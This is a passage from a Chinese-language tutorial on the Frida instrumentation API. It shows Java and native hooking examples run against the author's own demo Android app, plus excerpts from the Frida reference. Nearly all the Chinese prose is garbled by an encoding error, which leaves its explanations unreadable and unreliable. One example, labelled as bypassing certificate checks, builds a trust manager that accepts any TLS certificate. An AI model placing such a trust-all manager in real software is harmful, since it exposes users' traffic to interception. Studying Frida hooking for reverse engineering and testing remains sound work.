‡æ–¹æ³•ã€‚ å¦å¤–ï¼Œæœ‰äº›åº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨æ¥åŠ è½½æŸäº›ç±»ï¼Œè¿™äº›ç±»å¯èƒ½å¹¶æ²¡æœ‰è¢« Java è™šæ‹Ÿæœºç›´æ¥åŠ è½½ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒJava.enumerateLoadedClasses () æ–¹æ³•å¯èƒ½æ— æ³•æ‰¾åˆ°ç›®æ ‡ç±»ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ Java.enumerateClassLoaders() æ–¹æ³•æ¥æšä¸¾è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œç„¶åè°ƒç”¨ç±»åŠ è½½å™¨çš„æ–¹æ³•æ¥åŠ è½½ç›®æ ‡ç±»ï¼Œæœ€ç»ˆå®šä½åˆ°ç›®æ ‡æ–¹æ³•ã€‚ # perform Java.performï¼ˆfnï¼‰ ä¸»è¦ç”¨äºå½“å‰çº¿ç¨‹é™„åŠ åˆ° Java VM å¹¶ä¸”è°ƒç”¨ fn æ–¹æ³•ã€‚ åŸºæœ¬å†™ frida éƒ½æ˜¯ç”¨è¿™ä¸ªå¼€å¤´çš„ä¸ä¼šä¸çŸ¥é“å§ï¼š) # use Java.use(className)ï¼Œ åŠ¨æ€è·å– className çš„ç±»å®šä¹‰ï¼Œé€šè¿‡å¯¹å…¶è°ƒç”¨ $new() æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå¯ä»¥ä»ä¸­å®ä¾‹åŒ–å¯¹è±¡ã€‚å½“æƒ³è¦å›æ”¶ç±»æ—¶å¯ä»¥è°ƒç”¨ $Dispose() æ–¹æ³•æ˜¾å¼é‡Šæ”¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç­‰å¾… JavaScript çš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå½“å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ä¹‹åï¼Œå¯ä»¥é€šè¿‡å…¶å®ä¾‹å¯¹è±¡è°ƒç”¨ç±»ä¸­çš„é™æ€æˆ–éé™æ€çš„æ–¹æ³• Java.use () æ–¹æ³•ç”¨äºè·å–æŒ‡å®šç±»çš„å¼•ç”¨ï¼Œå¯ä»¥åœ¨ JavaScript è„šæœ¬ä¸­ç›´æ¥è°ƒç”¨è¯¥ç±»çš„é™æ€æ–¹æ³•å’Œæˆå‘˜å˜é‡ï¼Œæˆ–è€…åˆ›å»ºè¯¥ç±»çš„å®ä¾‹å¯¹è±¡å¹¶è°ƒç”¨å…¶æ–¹æ³•ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä½¿ç”¨ Java.use () æ–¹æ³•éœ€è¦æå‰äº†è§£ç›®æ ‡ç±»çš„ç»“æ„å’Œæ¥å£ï¼Œæ¯”è¾ƒé€‚åˆäºé™æ€çš„åˆ†æå’Œ Hookã€‚ // è¾“å‡º fun () å‡½æ•°ä¼ å…¥çš„å‚æ•°ä»¥åŠè¿”å›å€¼function frida_Java_1()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; var return_value = this.fun(x,y); console.log(\"fun() called with x = \", x , \",y = \", y ,\",return_value = \",return_value); return return_value; &#125; &#125;)&#125;// ä¿®æ”¹ fun () å‡½æ•°æ‰“å°çš„å†…å®¹ä¸º x-yfunction frida_Java_2()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \", x , \",y = \", y ,\",return_value = \",return_value); var z = x - y; var Log = Java.use(\"android.util.Log\"); Log.d(\"sum\", \"\"+z); var return_value = this.fun(x,y); return return_value; &#125; &#125;)&#125;// ä¿®æ”¹ fun å‡½æ•°çš„ä»£ç ä¸ºä»…ä»…æ‰“å° x-yfunction frida_Java_3()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \", x , \",y = \", y); var Log = Java.use(\"android.util.Log\"); Log.d(\"sum\", \"\"+ (x-y)); &#125; &#125;)&#125;//setImmediate(frida_Java_1,0);//[SM-P200::com.oacia.frida_a02_01_demo2 ]-> fun() called with x = 50 ,y = 30 ,return_value = undefined//setImmediate(frida_Java_2,0);//LogCat/** * è¿™é‡Œæ—¢ Log äº† x+y (80), åˆ Log äº† x-y (40)2023-04-05 13:49:52.550 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:52.552 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 802023-04-05 13:49:53.556 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:53.557 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 802023-04-05 13:49:54.560 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:54.562 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 80 */setImmediate(frida_Java_3,0);/** * ç›´æ¥å°† fun å‡½æ•°æ›¿æ¢æˆè‡ªå·±å†™çš„ä»£ç äº†ï½2023-04-05 14:05:00.529 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:01.532 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:02.535 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:03.539 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:04.542 20331-20331 sum com.oacia.frida_a02_01_demo2 D 20 */# choose Java.choose () æ–¹æ³•ç”¨äºè·å–æŒ‡å®šç±»çš„å®ä¾‹å¯¹è±¡ï¼Œå¯ä»¥åœ¨ JavaScript è„šæœ¬ä¸­æšä¸¾æŒ‡å®šç±»çš„æ‰€æœ‰å®ä¾‹å¯¹è±¡ï¼Œå¹¶é€ä¸€è°ƒç”¨å…¶æ–¹æ³•ï¼Œç”¨äºåŠ¨æ€çš„åˆ†æå’Œ Hookã€‚è¯¥æ–¹æ³•éœ€è¦æä¾›ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œç”¨äºæ£€æµ‹ç›®æ ‡å¯¹è±¡æ˜¯å¦ç¬¦åˆç‰¹å®šçš„æ¡ä»¶ã€‚å½“æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å¯¹è±¡æ—¶ï¼Œè¯¥å‡½æ•°å°†è¢«è°ƒç”¨ï¼Œå¯ä»¥åœ¨è¯¥å‡½æ•°ä¸­å¯¹ç›®æ ‡å¯¹è±¡è¿›è¡Œåˆ†æå’Œä¿®æ”¹ã€‚ Java.perform(function () &#123; // æŸ¥æ‰¾ android.view.View ç±»åœ¨å †ä¸Šçš„å®ä¾‹åŒ–å¯¹è±¡ Java.choose(\"android.view.View\", &#123; // æšä¸¾æ—¶è°ƒç”¨ onMatch:function(instance)&#123; // æ‰“å°å®ä¾‹ console.log(instance); &#125;, // æšä¸¾å®Œæˆåè°ƒç”¨ onComplete:function() &#123; console.log(\"end\") &#125;&#125;);&#125;);è¾“å‡ºå¦‚ä¸‹ï¼šandroid.view.View&#123;2292774 V.ED..... ......ID 0,1794-1080,1920 #1020030 android:id/navigationBarBackground&#125;android.view.View&#123;d43549d V.ED..... ......ID 0,0-1080,63 #102002f android:id/statusBarBackground&#125;end Java.use() ä¸ Java.choose() æœ€å¤§çš„åŒºåˆ«ï¼Œå°±æ˜¯åœ¨äºå‰è€…ä¼šæ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼Œåè€…ä¼šé€‰æ‹©å†…å­˜ä¸­å·²æœ‰çš„å®ä¾‹ã€‚ # cast Java.cast(handle, klass) ï¼Œå°±æ˜¯å°†æŒ‡å®šå˜é‡æˆ–è€…æ•°æ®å¼ºåˆ¶è½¬æ¢æˆä½ æ‰€æœ‰éœ€è¦çš„ç±»å‹ï¼›åˆ›å»ºä¸€ä¸ª JavaScript åŒ…è£…å™¨ï¼Œç»™å®šä» Java.useï¼ˆï¼‰ è¿”å›çš„ç»™å®šç±» klas çš„å¥æŸ„çš„ç°æœ‰å®ä¾‹ã€‚æ­¤ç±»åŒ…è£…å™¨è¿˜å…·æœ‰ç”¨äºè·å–å…¶ç±»çš„åŒ…è£…å™¨çš„ç±»å±æ€§ï¼Œä»¥åŠç”¨äºè·å–å…¶ç±»åçš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„ $className å±æ€§ï¼Œé€šå¸¸åœ¨æ‹¦æˆª so å±‚æ—¶ä¼šä½¿ç”¨æ­¤å‡½æ•°å°† jstringã€jarray ç­‰ç­‰è½¬æ¢ä¹‹åæŸ¥çœ‹å…¶å€¼ã€‚ var clazz = Java.use(\"java.lang.Class\");var cls = Java.cast(obj.getClass(),clazz); // å…ˆè·å– obj çš„ Classï¼Œç„¶åå†å¼ºè½¬æˆ Class ç±»å‹ã€‚# array Java.perform(function () &#123; // å®šä¹‰ä¸€ä¸ª int æ•°ç»„ã€å€¼æ˜¯ 1003, 1005, 1007 var intarr = Java.array('int', [ 1003, 1005, 1007 ]); // å®šä¹‰ä¸€ä¸ª byte æ•°ç»„ã€å€¼æ˜¯ 0x48, 0x65, 0x69 var bytearr = Java.array('byte', [ 0x48, 0x65, 0x69 ]); for(var i=0;i&lt;bytearr.length;i++) &#123; // è¾“å‡ºæ¯ä¸ª byte å…ƒç´  console.log(bytearr[i]) &#125;&#125;); ç´¢å¼• type å«ä¹‰ 1 Z boolean 2 B byte 3 C char 4 S short 5 I int 6 J long 7 F float 8 D double 9 V void # registerClass Java.registerClass ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Java ç±»å¹¶è¿”å›ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå…¶ä¸­è§„èŒƒæ˜¯ä¸€ä¸ªåŒ…å«ï¼š name ï¼šæŒ‡å®šç±»åç§°çš„å­—ç¬¦ä¸²ã€‚ superClass ï¼šï¼ˆå¯é€‰ï¼‰çˆ¶ç±»ã€‚è¦ä» java.lang.Objec t ç»§æ‰¿çš„çœç•¥ã€‚ implements ï¼šï¼ˆå¯é€‰ï¼‰ç”±æ­¤ç±»å®ç°çš„æ¥å£æ•°ç»„ã€‚ fields ï¼šï¼ˆå¯é€‰ï¼‰å¯¹è±¡ï¼ŒæŒ‡å®šè¦å…¬å¼€çš„æ¯ä¸ªå­—æ®µçš„åç§°å’Œç±»å‹ã€‚ methods ï¼šï¼ˆå¯é€‰ï¼‰å¯¹è±¡ï¼ŒæŒ‡å®šè¦å®ç°çš„æ–¹æ³•ã€‚ Java.perform(function () &#123; // æ³¨å†Œä¸€ä¸ªç›®æ ‡è¿›ç¨‹ä¸­çš„ç±»ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªç±»å¯¹è±¡ var hellojni = Java.registerClass(&#123; name: 'com.roysue.roysueapplication.hellojni' &#125;); console.log(hellojni.addInt(1,2));&#125;);# å®˜æ–¹ç”¨æ³• - ç»•è¿‡è¯ä¹¦æ£€éªŒ è¿™ä¸ªæ–¹æ³•å¤ªé«˜ç«¯äº†ï¼Œæœªæ¥æœ‰æœºä¼šè‡ªå·±å†™ä¸€ä¸ª demo å°è¯•ä¸€ä¸‹ // è·å–ç›®æ ‡è¿›ç¨‹çš„ SomeBaseClass ç±»var SomeBaseClass = Java.use('com.example.SomeBaseClass');// è·å–ç›®æ ‡è¿›ç¨‹çš„ X509TrustManager ç±»var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');var MyWeirdTrustManager = Java.registerClass(&#123; // æ³¨å†Œä¸€ä¸ªç±»æ˜¯è¿›ç¨‹ä¸­çš„ MyWeirdTrustManager ç±» name: 'com.example.MyWeirdTrustManager', // çˆ¶ç±»æ˜¯ SomeBaseClass ç±» superClass: SomeBaseClass, // å®ç°äº† MyWeirdTrustManager æ¥å£ç±» implements: [X509TrustManager], // ç±»ä¸­çš„å±æ€§ fields: &#123; description: 'java.lang.String', limit: 'int', &#125;, // å®šä¹‰çš„æ–¹æ³• methods: &#123; // ç±»çš„æ„é€ å‡½æ•° $init: function () &#123; console.log('Constructor called'); &#125;, //X509TrustManager æ¥å£ä¸­æ–¹æ³•ä¹‹ä¸€ï¼Œè¯¥æ–¹æ³•ä½œç”¨æ˜¯æ£€æŸ¥å®¢æˆ·ç«¯çš„è¯ä¹¦ checkClientTrusted: function (chain, authType) &#123; console.log('checkClientTrusted'); &#125;, // è¯¥æ–¹æ³•æ£€æŸ¥æœåŠ¡å™¨çš„è¯ä¹¦ï¼Œä¸ä¿¡ä»»æ—¶ã€‚åœ¨è¿™é‡Œé€šè¿‡è‡ªå·±å®ç°è¯¥æ–¹æ³•ï¼Œå¯ä»¥ä½¿ä¹‹ä¿¡ä»»æˆ‘ä»¬æŒ‡å®šçš„ä»»ä½•è¯ä¹¦ã€‚åœ¨å®ç°è¯¥æ–¹æ³•æ—¶ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ä¸åšä»»ä½•å¤„ç†ï¼Œå³ä¸€ä¸ªç©ºçš„å‡½æ•°ä½“ï¼Œç”±äºä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå®ƒå°±ä¼šä¿¡ä»»ä»»ä½•è¯ä¹¦ã€‚ checkServerTrusted: [&#123; // è¿”å›å€¼ç±»å‹ returnType: 'void', // å‚æ•°åˆ—è¡¨ argumentTypes: ['[Ljava.security.cert.X509Certificate;', 'java.lang.String'], // å®ç°æ–¹æ³• implementation: function (chain, authType) &#123; // è¾“å‡º console.log('checkServerTrusted A'); &#125; &#125;, &#123; returnType: 'java.util.List', argumentTypes: ['[Ljava.security.cert.X509Certificate;', 'java.lang.String', 'java.lang.String'], implementation: function (chain, authType, host) &#123; console.log('checkServerTrusted B'); // è¿”å› null ä¼šä¿¡ä»»æ‰€æœ‰è¯ä¹¦ return null; &#125; &#125;], // è¿”å›å—ä¿¡ä»»çš„ X509 è¯ä¹¦æ•°ç»„ã€‚ getAcceptedIssuers: function () &#123; console.log('getAcceptedIssuers'); return []; &#125;, &#125;&#125;);# [TODO] ä¸€ä¸ªå° demo, å¯ä»¥ç”¨åˆ° Java.registerClass (spec) # vm è¿™ä¸ªæ–¹æ³•ä¹Ÿå…³è”åˆ° native å±‚äº†ï¼Œå…ˆæŠŠ Java å±‚çš„ hook æææ˜ç™½å§ QAQ function frida_Java() &#123; Java.perform(function () &#123; // æ‹¦æˆª getStr å‡½æ•° Interceptor.attach(Module.findExportByName(\"libhello.so\" , \"Java_com_roysue_roysueapplication_hellojni_getStr\"), &#123; onEnter: function(args) &#123; console.log(\"getStr\"); &#125;, onLeave:function(retval)&#123; // å®ƒçš„è¿”å›å€¼çš„æ˜¯ retval åœ¨ jni å±‚ getStr çš„è¿”å›å€¼çš„ jstring // æˆ‘ä»¬åœ¨è¿™é‡Œåšçš„äº‹æƒ…å°±æ˜¯æ›¿æ¢æ‰ç»“æœ // å…ˆè·å–ä¸€ä¸ª Env å¯¹è±¡ var env = Java.vm.getEnv(); // é€šè¿‡ newStringUtf æ–¹æ³•æ„å»ºä¸€ä¸ª jstirng å­—ç¬¦ä¸² var jstring = env.newStringUtf('roysue'); //replace æ›¿æ¢æ‰ç»“æœ retval.replace(jstring); console.log(\"getSumæ–¹æ³•è¿”å›å€¼ä¸º:roysue\") &#125; &#125;);&#125;setImmediate(frida_Java,0);# Interceptor å¯¹è±¡ # attach å‡½æ•°åŸå‹: Interceptor.attach(target, callbacks) å‚æ•° 1: target å‚æ•° target æ˜¯éœ€è¦æ‹¦æˆªçš„ä½ç½®çš„å‡½æ•°åœ°å€ï¼Œä¹Ÿå°±æ˜¯å¡«æŸä¸ª so å±‚å‡½æ•°çš„åœ°å€å³å¯å¯¹å…¶æ‹¦æˆªï¼Œä»–æ˜¯ä¸€ä¸ª NativePointer ç±»å‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¯¹äº Thumb å‡½æ•°éœ€è¦å¯¹å‡½æ•°åœ°å€ +1 å‚æ•° 2: callbacks callbacks æ˜¯è§¦å‘æ‹¦æˆªäº‹ä»¶ä¹‹åçš„è§¦å‘çš„å›è°ƒå‡½æ•°ï¼Œä»–æœ‰ä»¥ä¸‹ä¸¤ä¸ªå›è°ƒå‡½æ•° onEnter(args) è°ƒç”¨è¢« hook å‡½æ•°æ—¶è§¦å‘ï¼Œç»™å®šä¸€ä¸ªå‚æ•° args ï¼Œå¯ç”¨äºè¯»å–æˆ–å†™å…¥å‚æ•°ä½œä¸º NativePointer å¯¹è±¡çš„æ•°ç»„ onLeave(retval) è¢« hook å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶è§¦å‘ï¼Œå¯ä»¥è°ƒç”¨ retval.replaceï¼ˆ1337ï¼‰ ä»¥æ•´æ•° 1337 æ›¿æ¢è¿”å›å€¼ï¼Œæˆ–è€…è°ƒç”¨ retval.replaceï¼ˆptrï¼ˆ&quot;0x1234&quot;ï¼‰ï¼‰ ä»¥æŒ‡é’ˆæ›¿æ¢è¿”å›å€¼ã€‚è¯·æ³¨æ„ï¼Œæ­¤å¯¹è±¡åœ¨ OnLeave è°ƒç”¨ä¸­å›æ”¶ï¼Œå› æ­¤ä¸è¦å°†å…¶å­˜å‚¨åœ¨å›è°ƒä¹‹å¤–å¹¶ä½¿ç”¨å®ƒã€‚å¦‚æœéœ€è¦å­˜å‚¨åŒ…å«çš„å€¼ï¼Œè¯·åˆ¶ä½œæ·±å‰¯æœ¬ï¼Œä¾‹å¦‚ï¼š ptr(retval.toString()) ã€‚ ä½¿ç”¨ç¤ºä¾‹ä»£ç  // ä½¿ç”¨ Module å¯¹è±¡ getExportByNameAPI ç›´æ¥è·å– libc.so ä¸­çš„å¯¼å‡ºå‡½æ•° read çš„åœ°å€ï¼Œå¯¹ read å‡½æ•°è¿›è¡Œé™„åŠ æ‹¦æˆªInterceptor.attach(Module.getExportByName('libc.so', 'read'), &#123; // æ¯æ¬¡ read å‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¼šæ‰§è¡Œ onEnter å›è°ƒå‡½æ•° onEnter: function (args) &#123; this.fileDescriptor = args[0].toInt32(); &#125;, //read å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åä¼šæ‰§è¡Œ onLeave å›è°ƒå‡½æ•° onLeave: function (retval) &#123; if (retval.toInt32() > 0) &#123; /* do something with this.fileDescriptor */ &#125; &#125;&#125;);Interceptor.attach å‡½æ•°çš„ä¸€äº›å±æ€§ å±æ€§ å«ä¹‰ returnAddress è¿”å›åœ°å€ï¼Œç±»å‹æ˜¯ NativePointer context ä¸Šä¸‹æ–‡ï¼šå…·æœ‰é”® pc å’Œ sp çš„å¯¹è±¡ï¼Œå®ƒä»¬æ˜¯åˆ†åˆ«ä¸º ia32/x64/arm æŒ‡å®š EIP/RIP/PC å’Œ ESP/RSP/SPçš„NativePointer å¯¹è±¡ã€‚å…¶ä»–å¤„ç†å™¨ç‰¹å®šçš„é”®ä¹Ÿå¯ç”¨ï¼Œä¾‹å¦‚ eaxã€raxã€r0ã€x0 ç­‰ã€‚ä¹Ÿå¯ä»¥é€šè¿‡åˆ†é…ç»™è¿™äº›é”®æ¥æ›´æ–°å¯„å­˜å™¨å€¼ã€‚ errno å½“å‰ errno å€¼ lastError å½“å‰æ“ä½œç³»ç»Ÿé”™è¯¯å€¼ threadId æ“ä½œç³»ç»Ÿçº¿ç¨‹ ID depth ç›¸å¯¹äºå…¶ä»–è°ƒç”¨çš„è°ƒç”¨æ·±åº¦ # detachAll è®©ä¹‹å‰æ‰€æœ‰çš„ Interceptor.attach é™„åŠ æ‹¦æˆªçš„å›è°ƒå‡½æ•°å¤±æ•ˆã€‚ # replace ç›¸å½“äºæ›¿æ¢æ‰åŸæœ¬çš„å‡½æ•°ï¼Œç”¨æ›¿æ¢æ—¶çš„å®ç°æ›¿æ¢ç›®æ ‡å¤„çš„å‡½æ•° ä½¿ç”¨ç¤ºä¾‹ function frida_Interceptor() &#123; Java.perform(function () &#123; // è¿™ä¸ª c_getSum æ–¹æ³•æœ‰ä¸¤ä¸ª int å‚æ•°ã€è¿”å›ç»“æœä¸ºä¸¤ä¸ªå‚æ•°ç›¸åŠ  // è¿™é‡Œç”¨ NativeFunction å‡½æ•°è‡ªå·±å®šä¹‰äº†ä¸€ä¸ª c_getSum å‡½æ•° var add_method = new NativeFunction(Module.findExportByName('libhello.so', 'c_getSum'), 'int',['int','int']); // è¾“å‡ºç»“æœ é‚£ç»“æœè‚¯å®šå°±æ˜¯ 3 console.log(\"result:\",add_method(1,2)); // è¿™é‡Œå¯¹åŸå‡½æ•°çš„åŠŸèƒ½è¿›è¡Œæ›¿æ¢å®ç° Interceptor.replace(add_method, new NativeCallback(function (a, b) &#123; //h ä¸è®ºæ˜¯ä»€ä¹ˆå‚æ•°éƒ½è¿”å› 123 return 123; &#125;, 'int', ['int', 'int'])); // å†æ¬¡è°ƒç”¨ åˆ™è¿”å› 123 console.log(\"result:\",add_method(1,2)); &#125;);&#125;# NativePointer new NativePointer(s) : creates a new NativePointer from the string s containing a memory address in either decimal, or hexadecimal if prefixed with â€˜0xâ€™. You may use the ptr(s) short-hand for brevity. isNull() : returns a boolean allowing you to conveniently check if a pointer is NULL add(rhs) , sub(rhs) , and(rhs) , or(rhs) , xor(rhs) : makes a new NativePointer with this NativePointer plus/minus/and/or/xor rhs , which may either be a number or another NativePointer shr(n) , shl(n) : makes a new NativePointer with this NativePointer shifted right/left by n bits not() : makes a new NativePointer with this NativePointerâ€™s bits inverted sign([key, data]) : makes a new NativePointer by taking this NativePointerâ€™s bits and adding pointer authentication bits, creating a signed pointer. This is a no-op if the current process does not support pointer authentication, returning this NativePointer instead of a new value. Optionally, key may be specified as a string. Supported values are: ia: The IA key, for signing code pointers. This is the default. ib: The IB key, for signing code pointers. da: The DA key, for signing data pointers. db: The DB key, for signing data pointers. The data argument may also be specified as a NativePointer/number-like value to provide extra data used for the signing, and defaults to 0 . strip([key]) : makes a new NativePointer by taking this NativePointerâ€™s bits and removing its pointer authentication bits, creating a raw pointer. This is a no-op if the current process does not support pointer authentication, returning this NativePointer instead of a new value. Optionally, key may be passed to specify which key was used to sign the pointer being stripped. Defaults to ia . (See sign() for supported values.) blend(smallInteger) : makes a new NativePointer by taking this NativePointerâ€™s bits and blending them with a constant, which may in turn be passed to sign() as data . equals(rhs) : returns a boolean indicating whether rhs is equal to this one; i.e. it has the same pointer value compare(rhs) : returns an integer comparison result just like String#localeCompare() toInt32() : casts this NativePointer to a signed 32-bit integer toString([radix = 16]) : converts to a string of optional radix (defaults to 16) toMatchPattern() : returns a string containing a Memory.scan() -compatible match pattern for this pointerâ€™s raw value readPointer() : reads a NativePointer from this memory location. A JavaScript exception will be thrown if the address isnâ€™t readable. writePointer(ptr) : writes ptr to this memory location. A JavaScript exception will be thrown if the address isnâ€™t writable. readS8() , readU8() , readS16() , readU16() , readS32() , readU32() , readShort() , readUShort() , readInt() , readUInt() , readFloat() , readDouble() : reads a signed or unsigned 8/16/32/etc. or float/double value from this memory location and returns it as a number. A JavaScript exception will be thrown if the address isnâ€™t readable. writeS8(value) , writeU8(value) , writeS16(value) , writeU16(value) , writeS32(value) , writeU32(value) , writeShort(value) , writeUShort(value) , writeInt(value) , writeUInt(value) , writeFloat(value) , writeDouble(value) : writes a signed or unsigned 8/16/32/etc. or float/double value to this memory location. A JavaScript exception will be thrown if the address isnâ€™t writable. readS64() , readU64() , readLong() , readULong() : reads a signed or unsigned 64-bit, or long-sized, value from this memory location and returns it as an Int64/UInt64 value. A JavaScript exception will be thrown if the address isnâ€™t readable. writeS64(value) , writeU64(value) , writeLong(value) , writeULong(value) : writes the Int64/UInt64 value to this memory location. A JavaScript exception will be thrown if the address isnâ€™t writable. readByteArray(length) : reads length bytes from this memory location, and returns it as an ArrayBuffer. This buffer may be efficiently transferred to your Frida-based application by passing it as the second argument to send() . A JavaScript exception will be thrown if any of the length bytes read from the address isnâ€™t readable. writeByteArray(bytes) : writes bytes to this memory location, where bytes is either an ArrayBuffer, typically returned from readByteArray() , or an array of integers between 0 and 255. For example: [ 0x13, 0x37, 0x42 ] . A JavaScript exception will be thrown if any of the bytes written to the address isnâ€™t writable. readCString([size = -1]) , readUtf8String([size = -1]) , readUtf16String([length = -1]) , readAnsiString([size = -1]) : reads the bytes at this memory location as an ASCII, UTF-8, UTF-16, or ANSI string. Supply the optional size argument if you know the size of the string in bytes, or omit it or specify -1 if the string is NUL-terminated. Likewise you may supply the optional length argument if you know the length of the string in characters. A JavaScript exception will be thrown if any of the size / length bytes read from the address isnâ€™t readable. Note that readAnsiString() is only available (and relevant) on Windows. writeUtf8String(str) , writeUtf16String(str) , writeAnsiString(str) : encodes and writes the JavaScript string to this memory location (with NUL-terminator). A JavaScript exception will be thrown if any of the bytes written to the address isnâ€™t writable. Note that writeAnsiString() is only available (and relevant) on Windows. # NativeFunction new NativeFunction(address, returnType, argTypes[, abi]) : create a new NativeFunction to call the function at address (specified with a NativePointer ), where returnType specifies the return type, and the argTypes array specifies the argument types. You may optionally also specify abi if not system default. For variadic functions, add a '...' entry to argTypes between the fixed arguments and the variadic ones. STRUCTS &amp; CLASSES BY VALUE As for structs or classes passed by value, instead of a string provide an array containing the structâ€™s field types following each other. You may nest these as deep as desired for representing structs inside structs. Note that the returned object is also a NativePointer , and can thus be passed to Interceptor#attach . This must match the struct/class exactly, so if you have a struct with three ints, you must pass ['int', 'int', 'int'] . For a class that has virtual methods, the first field will be a pointer to the vtable. For C++ scenarios involving a return value that is larger than Process.pointerSize , a typical ABI may expect that a NativePointer to preallocated space must be passed in as the first parameter. (This scenario is common in WebKit, for example.) SUPPORTED TYPES void pointer int uint long ulong char uchar size_t ssize_t float double int8 uint8 int16 uint16 int32 uint32 int64 uint64 bool SUPPORTED ABIS default Windows 32-bit: sysv stdcall thiscall fastcall mscdecl Windows 64-bit: win64 UNIX x86: sysv unix64 UNIX ARM: sysv vfp new NativeFunction(address, returnType, argTypes[, options]) : just like the previous constructor, but where the fourth argument, options , is an object that may contain one or more of the following keys: abi : same enum as above. scheduling : scheduling behavior as a string. Supported values are: cooperative: Allow other threads to execute JavaScript code while calling the native function, i.e. let go of the lock before the call, and re-acquire it afterwards. This is the default behavior. exclusive: Do not allow other threads to execute JavaScript code while calling the native function, i.e. keep holding the JavaScript lock. This is faster but may result in deadlocks. exceptions : exception behavior as a string. Supported values are: steal: If the called function generates a native exception, e.g. by dereferencing an invalid pointer, Frida will unwind the stack and steal the exception, turning it into a JavaScript exception that can be handled. This may leave the application in an undefined state, but is useful to avoid crashing the process while experimenting. This is the default behavior. propagate: Let the application deal with any native exceptions that occur during the function call. (Or, the handler installed through Process.setExceptionHandler() .) traps : code traps to be enabled, as a string. Supported values are: default: Interceptor.attach() callbacks will be called if any hooks are triggered by a function call. all: In addition to Interceptor callbacks, Stalker may also be temporarily reactivated for the duration of each function call. This is useful for e.g. measuring code coverage while guiding a fuzzer, implementing â€œstep intoâ€ in a debugger, etc. Note that this is also possible when using the Java and ObjC APIs, as method wrappers also provide a clone(options) API to create a new method wrapper with custom NativeFunction options. # frida ä½¿ç”¨ç¤ºä¾‹ åˆæ­¥äº†è§£äº†ä¸€äº› API çš„å®šä¹‰å’Œç”¨æ³•ï¼Œæ¥ä¸‹æ¥å°è¯•ä¸€äº›ä¾‹å­æ¥å®è·µä¸€ä¸‹ # hook å‡½æ•°çš„å‚æ•°ï¼Œå¹¶ä¿®æ”¹å‡½æ•°è¿”å›çš„ç»“æœ # source code package com.oacia.frida_a02_01_demo2;import androidx.appcompat.app.AppCompatActivity;import android.annotation.SuppressLint;import android.os.Bundle;import android.util.Log;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; @SuppressLint(\"SetTextI18n\") @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView myTextView = findViewById(R.id.MyTextView); //myTextView.setText(\"oacia: hello android!!nice to meet you~\"); myTextView.setText(\"oacia:Hello Android!\"); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; fun(50,30); &#125; &#125; void fun(int x,int y)&#123; Log.d(\"oacia-sum\",String.valueOf(x+y)); &#125;&#125;è¿™ä¸ª app çš„ä½œç”¨æ˜¯æ¯éš” 1 ç§’ Log è¾“å‡º 80, æ¥ä¸‹æ¥æˆ‘å°†ä½¿ç”¨ frida æ¥æ‰“å° fun() å‡½æ•°ä¼ å…¥çš„å‚æ•°ï¼Œå¹¶ä¸”ä¿®æ”¹ä¼ å…¥å‚æ•°çš„å€¼ # frida code function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"com.oacia.frida_a02_01_demo2.MainActivity\"); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \" + x + \",y = \" + y); console.log(\"oacia will change fun()'s argv[0] and argv[1]\"); console.log(\"wait and see~\"); const retv = this.fun(60,90); return retv; &#125; &#125;)&#125;setImmediate(hook,0);/**powershell * [SM P200::com.oacia.frida_a02_01_demo2 ]-> fun() called with x = 50,y = 30oacia will change fun()'s argv[0] and argv[1]wait and see~fun() called with x = 50,y = 30oacia will change fun()'s argv[0] and argv[1]wait and see~ *//**logcat04-05 20:16:07.521 27216 27216 D oacia-sum: 8004-05 20:16:08.522 27216 27216 D oacia-sum: 8004-05 20:16:09.522 27216 27216 D oacia-sum: 8004-05 20:16:26.420 27285 27285 D oacia-sum: 15004-05 20:16:27.421 27285 27285 D 